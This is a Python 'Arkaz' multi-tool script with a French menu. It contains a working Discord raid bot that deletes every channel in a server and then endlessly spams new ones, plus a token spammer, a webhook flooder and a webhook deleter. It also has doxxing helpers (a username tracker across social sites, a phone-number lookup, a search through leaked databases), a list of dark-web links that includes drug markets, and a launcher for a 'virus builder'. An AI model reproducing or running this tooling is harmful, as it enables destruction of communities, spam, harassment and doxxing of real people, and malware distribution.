import os 
import requests
import discord
from discord.ext import commands
import random
import asyncio
import threading
import webbrowser
import phonenumbers
from phonenumbers import geocoder, carrier
import subprocess

RED = "\033[31m" 
logo = f"""{RED}
                                      █████╗ ██████╗ ██╗  ██╗ █████╗ ███████╗
                                     ██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗╚══███╔╝
                                     ███████║██████╔╝█████╔╝ ███████║  ███╔╝ 
                                     ██╔══██║██╔══██╗██╔═██╗ ██╔══██║ ███╔╝  
                                     ██║  ██║██║  ██║██║  ██╗██║  ██║███████╗ 
                                     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ 
""" 

def raidbot():
    os.system("cls")
    print(logo)
    token = input("Token de ton bot -> ")
    salon = input("Nom des salons -> ")
    msg = input("Message a spam -> ")

    intents = discord.Intents().all()
    bot = commands.Bot(command_prefix="!", help_command=None, intents=discord.Intents.all())

    @bot.event
    async def on_ready():
        os.system("cls")
        print("!nuke ")
        @bot.command()
        async def nuke(ctx):
            guild = ctx.guild
            delete = [channel.delete() for channel in guild.channels]
            await asyncio.gather(*delete)
            while True:
                randommmm = random.randint(1, 1000)
                channels = await asyncio.gather(
                    *[guild.create_text_channel(f"{salon}{randommmm + i}") for i in range(30)]
                    )
                await asyncio.gather(
                    *[channel.send(msg) for channel in channels for i in range(10)]
                    )


    bot.run(token)

def webhookspam():
    os.system("cls")
    print(logo)
    webhook = input("Webhook : ")
    msg = input("Message : ")
    name = input("Nom du webhook : ")
    webhook_url = webhook  
    data = {
    "content": msg,
    "username": name  
    }
    while True:
       response = requests.post(webhook_url, json=data)
def webhookdelete():
    os.system("cls")
    print(logo)
    webhook = input("Webhook : ")
    webhook_url = webhook  
    response = requests.delete(webhook_url)

def tokensend(token, id, msg):
    payload = {'content': msg}
    header = {'authorization': token}
    requests.post(f"https://discord.com/api/v9/channels/{id}/messages", data=payload, headers=header)


def tokenspam():
    os.system("cls")
    print(logo)
    token = input("Token : ")
    id = input("ID du salon à spammer : ")
    msg = input("Message : ")

    while True:
        threads = []
        for _ in range(5):  
            thread = threading.Thread(target=tokensend, args=(token, id, msg))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()



def sreach():
    os.system("cls")
    print(logo)
    site = """
Le pseudo va etres chercher dans :
> github
> google
> tiktok
> instagram
> paypal
> snapchat
> telegram
> steam
> facebook
> xbox
> twitch

    """
    print (site)
    print("")
    name = input("Pseudo a chercher : ")
    webbrowser.open(f"https://github.com/search?q={name}&type=users")
    webbrowser.open(f"https://www.google.com/search?client=opera&q={name}&sourceid=opera&ie=UTF-8&oe=UTF-8")
    webbrowser.open(f"https://www.tiktok.com/@{name}")
    webbrowser.open(f"https://www.instagram.com/{name}")
    webbrowser.open(f"https://www.paypal.com/paypalme/{name}")
    webbrowser.open(f"https://www.snapchat.com/add/{name}")
    webbrowser.open(f"https://t.me/{name}")
    webbrowser.open(f"https://steamcommunity.com/id/{name}")
    webbrowser.open(f"https://www.facebook.com/{name}")
    webbrowser.open(f"https://www.xboxgamertag.com/search/{name}")
    webbrowser.open(f"https://www.twitch.tv/{name}")

def onionlink():
    os.system("cls")
    print(logo)
    ouinon = input("Cree un fichier avec tout les liens (oui/non) ?")
    if ouinon == "non":
        menu()
    if ouinon == "oui":
        link = """
http://xmh57jrknzkhv6y3ls3ubitzfqnkrwxhopf5aygthi7d6rplyvk3noyd.onion/
http://danexio627wiswvlpt6ejyhpxl5gla5nt2tgvgm2apj2ofrgm44vbeyd.onion/
http://e27slbec2ykiyo26gfuovaehuzsydffbit5nlxid53kigw3pvz6uosqd.onion/
http://answerszuvs3gg2l64e6hmnryudl5zgrmwm3vh65hzszdghblddvfiqd.onion/
http://ozmh2zkwx5cjuzopui64csb5ertcooi5vya6c2gm4e3vcvf2c2qvjiyd.onion/
http://y22arit74fqnnc2pbieq3wqqvkfub6gnlegx3cl6thclos4f7ya7rvad.onion/
http://hqfld5smkr4b4xrjcco7zotvoqhuuoehjdvoin755iytmpk4sm7cbwad.onion/
http://mp3fpv6xbrwka4skqliiifoizghfbjy5uyu77wwnfruwub5s4hly2oid.onion/
http://p2qzxkca42e3wccvqgby7jrcbzlf6g7pnkvybnau4szl5ykdydzmvbid.onion/
http://ovai7wvp4yj6jl3wbzihypbq657vpape7lggrlah4pl34utwjrpetwid.onion/
http://lgh3eosuqrrtvwx3s4nurujcqrm53ba5vqsbim5k5ntdpo33qkl7buyd.onion/
http://ecwvi3cd6h27r2kjx6ur6gdi4udrh66omvqeawp3dzqrtfwo432s7myd.onion/
http://deepmar4ai3iff7akeuos3u3727lvuutm4l5takh3dmo3pziznl5ywqd.onion/
http://iwggpyxn6qv3b2twpwtyhi2sfvgnby2albbcotcysd5f7obrlwbdbkyd.onion/
http://rfyb5tlhiqtiavwhikdlvb3fumxgqwtg2naanxtiqibidqlox5vispqd.onion/
http://ajlu6mrc7lwulwakojrgvvtarotvkvxqosb4psxljgobjhureve4kdqd.onion/
http://sga5n7zx6qjty7uwvkxpwstyoh73shst6mx3okouv53uks7ks47msayd.onion/
http://55niksbd22qqaedkw36qw4cpofmbxdtbwonxam7ov2ga62zqbhgty3yd.onion/
http://s57divisqlcjtsyutxjz2ww77vlbwpxgodtijcsrgsuts4js5hnxkhqd.onion/
http://jbtb75gqlr57qurikzy2bxxjftzkmanynesmoxbzzcp7qf5t46u7ekqd.onion/
http://rxmyl3izgquew65nicavsk6loyyblztng6puq42firpvbe32sefvnbad.onion/
http://t43fsf65omvf7grt46wlt2eo5jbj3hafyvbdb7jtr2biyre5v24pebad.onion/
http://3bp7szl6ehbrnitmbyxzvcm3ieu7ba2kys64oecf4g2b65mcgbafzgqd.onion/
http://xykxv6fmblogxgmzjm5wt6akdhm4wewiarjzcngev4tupgjlyugmc7qd.onion/
http://wk3mtlvp2ej64nuytqm3mjrm6gpulix623abum6ewp64444oreysz7qd.onion/
http://asap4u7rq4tyakf5gdahmj2c77blwc4noxnsppp5lzlhk7x34x2e22yd.onion/
http://asap2u4pvplnkzl7ecle45wajojnftja45wvovl3jrvhangeyq67ziid.onion/
http://asap4u2ihsunfdsumm66pmado3mt3lemdiu3fbx5b7wj5hb3xpgmwkqd.onion/
http://cannabmgae3mkekotfzsyrx5lqg7lj7hgcn6t4rumqqs5vnvmuzsmfqd.onion/
http://cannaczy4w2nwu6d2vi5ugudrs23a4lpto2crxjl2tdvyxncsa7uwaid.onion/
http://cannabmuc64fbglolpkvnmqynsx226pg27rgimfe3gye3emgtgodohqd.onion/
http://hydraclubbioknikokex7njhwuahc2l67lfiz7z36md2jvopda7nchid.onion/
http://pqqmr3p3tppwqvvapi6fa7jowrehgd36ct6lzr26qqormaqvh6gt4jyd.onion/
http://rrlm2f22lpqgfhyydqkxxzv6snwo5qvc2krjt2q557l7z4te7fsvhbid.onion/
http://wbz2lrxhw4dd7h5t2wnoczmcz5snjpym4pr7dzjmah4vi6yywn37bdyd.onion/
http://7mejofwihleuugda5kfnr7tupvfbaqntjqnfxc4hwmozlcmj2cey3hqd.onion/
http://guzjgkpodzshso2nohspxijzk5jgoaxzqioa7vzy6qdmwpz3hq4mwfid.onion/
http://n6qisfgjauj365pxccpr5vizmtb5iavqaug7m7e4ewkxuygk5iim6yyd.onion/
http://kl4gp72mdxp3uelicjjslqnpomqfr5cbdd3wzo5klo3rjlqjtzhaymqd.onion/
http://marijuanaman43fi4t7el66di7vdpbfyhvkgk4mt7wxkg6erfkv65npy3d.onion/
http://7myb7itqew5ffqftvxjh2k7qxwrh7imavxlpn3fxa32d3rvw32e3s7ad.onion/
http://hdfozcnzivftjokvkdjzl6fhq3c7ltyct6db4efov2w4p7xb6rmhlfqd.onion/
http://7gppr7tlr6twnr2whsqj7scfhdeu37tnhwb5t5kffmrfzzvj7hfgowd.onion/
http://uj3wazyk5kz5rzs.onion/
http://1337xwlc2c8sf3d7.onion/
http://foxy6vayr5g5hwwx.onion/
http://wikitjerrta4qgz4.onion/
http://wikicbtbf7rgjjbqe.onion/
http://3bp7szl6ehbrnitmbyxzvcm3ieu7ba2kys64oecf4g2b65mcgbafzgqd.onion/
http://pqqmr3p3tppwqvvapi6fa7jowrehgd36ct6lzr26qqormaqvh6gt4jyd.onion/
http://edu.onion/"""
    fichier = open("onionlink.txt", "a")
    fichier.write(link)
    fichier.close()

def aciigen():
    os.system("cls")
    print(logo)
    caca = input("Choisie un mot : ")
    webbrowser.open(f"https://patorjk.com/software/taag/#p=display&f=ANSI%20Shadow&t={caca}%0A")

def numlookup():
    tel = input("Numero a lookup : ")
    paytel = input("Pays du numero (en,fr...) : ")
    
    phone = phonenumbers.parse(tel, paytel)
    
    pays = geocoder.description_for_number(phone, paytel)
    operateur = carrier.name_for_number(phone, paytel)
    valide = phonenumbers.is_valid_number(phone)
    
    return {
        "Pays": pays,
        "Opérateur": operateur,
        "Valide": valide
    }

def afficherinfonum():
    os.system("cls")
    print(logo)
    info = numlookup()
    print(info)

def database():
    os.system("cls")
    print(logo)
    nom = input("Quelle est le nom du fichier ? : ")
    info = input("Quelle info voulez vous chercher ? : ")

    chaine = info 

    os.system("cls")
    fichier = open(f"{nom}","r")
    for ligne in fichier:
      if chaine in ligne:
        print(f"Voici ce qu il ya sur {info} dans {nom} : ")
        print(ligne)
        print("")
    fichier.close()

def robloxinfo():
    os.system("cls")  
    print(logo)    
    user_id = input("ID Roblox : ")
    url = f"https://users.roblox.com/v1/users/{user_id}"    
    response = requests.get(url)
    user_data = response.json()        
    username = user_data.get('name', 'Nom non disponible')
    bio = user_data.get('description', 'Biographie non disponible')
    created = user_data.get('created', 'Date de création non disponible')
    user_id_api = user_data.get('id', 'ID non disponible') 
    print("─────────────────────────────────────────────────────")
    print(f"[+] Nom d'utilisateur: {username}")
    print(f"[+] ID utilisateur: {user_id_api}")
    print(f"[+] Biographie: {bio}")
    print(f"[+] Date de création du compte: {created}")
    print("──────────────────────────────────────────────────────")


def menu():
    os.system("cls")
    logo = f"""{RED}
                                      █████╗ ██████╗ ██╗  ██╗ █████╗ ███████╗
                                     ██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗╚══███╔╝
                                     ███████║██████╔╝█████╔╝ ███████║  ███╔╝ 
                                     ██╔══██║██╔══██╗██╔═██╗ ██╔══██║ ███╔╝  
                                     ██║  ██║██║  ██║██║  ██╗██║  ██║███████╗  > AKR <
                                     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ 
                                                 
                ┌─────────DISCORD─────────┐  ┌─────────OSINT─────────┐  ┌─────────AUTRE─────────┐
                     [1] RAID BOT               [5] PSEUDO TRACKER         [9] ONION LINK
                     [2] TOKEN SPAM             [6] NUM LOOKUP             [10] ASCII GEN
                     [3] WEBHOOK DELETE         [7] SEARCH IN DB           [11] VIRUS BUILDER
                     [4] WEBHOOK SPAMMER        [8] ID ROBLOX INFO
"""
    login = os.getlogin()
    print(logo)
    print("")
    print(f"┌─[{login}]ᵃʳᵏᵃᶻ")
    choice = input("└─$ ")

    if choice == "4":
        webhookspam()
    elif choice == "1":
        raidbot()
    elif choice == "2":
        tokenspam()
    elif choice == "5":
        sreach()
    elif choice == "3":
        webhookdelete()
    elif choice == "6":
        afficherinfonum()
    elif choice == "7":
        database()
    elif choice == "8":
        robloxinfo()
    elif choice == "9":
        onionlink()
    elif choice == "10":
        aciigen()
    elif choice == "11":
        subprocess.run(['python', 'virusbuilder.py'])

menu()